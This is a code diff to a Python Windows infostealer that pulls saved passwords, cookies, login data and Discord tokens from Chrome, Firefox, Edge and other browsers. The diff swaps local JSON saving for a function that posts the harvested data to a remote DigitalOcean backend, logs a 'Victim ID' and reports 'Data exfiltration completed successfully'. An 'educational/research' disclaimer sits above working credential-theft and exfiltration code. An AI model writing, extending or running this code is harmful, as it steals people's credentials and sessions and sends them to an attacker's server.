@@ -3,7 +3,7 @@ Token and Password Extraction Module for Windows
 - Extracts saved credentials from multiple browsers:
   Chrome, Brave, Firefox, Opera, Microsoft Edge, Vivaldi, etc.
 - Retrieves tokens, cookies, and login data
-- Saves extracted data to local JSON file
+- Sends extracted data to backend server
 
 WARNING: This is for EDUCATIONAL/RESEARCH purposes only.
 Unauthorized access to computer systems is illegal.
@@ -16,11 +16,12 @@ import base64
 import sqlite3
 import shutil
 import platform
+import requests
 from datetime import datetime, timedelta
 from pathlib import Path
 
-# Output directory for extracted data
-OUTPUT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "extracted_data")
+# Backend server URL
+BACKEND_URL = "https://clownfish-app-5kdkx.ondigitalocean.app"
 
 # Browser paths configuration for Windows
 # Format: (browser_name, local_state_path, login_data_path, cookies_path, history_path)
@@ -681,29 +682,53 @@ def get_discord_tokens():
     return tokens
 
 
-def save_to_json(data, filename="browser_data.json"):
+def send_to_backend(data):
     """
-    Save extracted data to local JSON file
+    Send extracted data to backend server
+    Uses the /api/credentials endpoint for structured storage
     """
     try:
-        # Create output directory if it doesn't exist
-        if not os.path.exists(OUTPUT_DIR):
-            os.makedirs(OUTPUT_DIR)
-            
-        # Generate filename with timestamp
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        output_file = os.path.join(OUTPUT_DIR, f"extracted_{timestamp}.json")
+        url = f"{BACKEND_URL}/api/credentials"
         
-        # Save data
-        with open(output_file, "w", encoding="utf-8") as f:
-            json.dump(data, f, indent=2, ensure_ascii=False)
-            
-        print(f"\n[+] Data saved to: {output_file}")
-        return output_file
+        headers = {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+        }
         
+        print(f"\n[*] Sending data to: {url}")
+        
+        response = requests.post(
+            url,
+            json=data,
+            headers=headers,
+            timeout=60
+        )
+        
+        if response.status_code == 201:
+            result = response.json()
+            print(f"[+] Data sent successfully!")
+            print(f"    Victim ID: {result.get('victim_id')}")
+            print(f"    Storage: {result.get('storage')}")
+            stats = result.get('stats', {})
+            print(f"    Stored - Passwords: {stats.get('passwords', 0)}, "
+                  f"Cookies: {stats.get('cookies', 0)}, "
+                  f"Tokens: {stats.get('tokens', 0)}, "
+                  f"History: {stats.get('history', 0)}")
+            return True
+        else:
+            print(f"[!] Failed to send data. Status: {response.status_code}")
+            print(f"[!] Response: {response.text}")
+            return False
+            
+    except requests.exceptions.ConnectionError:
+        print("[!] Connection error - server may be offline")
+        return False
+    except requests.exceptions.Timeout:
+        print("[!] Request timed out")
+        return False
     except Exception as e:
-        print(f"[!] Error saving data: {e}")
-        return None
+        print(f"[!] Error sending data: {e}")
+        return False
 
 
 def collect_all_data():
@@ -810,7 +835,7 @@ def collect_all_data():
 
 def main():
     """
-    Main function - collect and save data locally
+    Main function - collect and send data to backend
     """
     print("""
     ╔═══════════════════════════════════════════════════════════════════╗
@@ -834,15 +859,14 @@ def main():
     # Collect all browser data
     collected_data = collect_all_data()
     
-    # Save to local JSON file
-    print("\n[*] Saving extracted data to local JSON file...")
-    output_file = save_to_json(collected_data)
+    # Send to backend server
+    print("\n[*] Sending extracted data to backend server...")
+    success = send_to_backend(collected_data)
     
-    if output_file:
-        print(f"\n[+] Extraction completed successfully!")
-        print(f"[+] Output file: {output_file}")
+    if success:
+        print(f"\n[+] Data exfiltration completed successfully!")
     else:
-        print("\n[!] Failed to save data!")
+        print("\n[!] Failed to send data to backend!")
     
     return collected_data
 
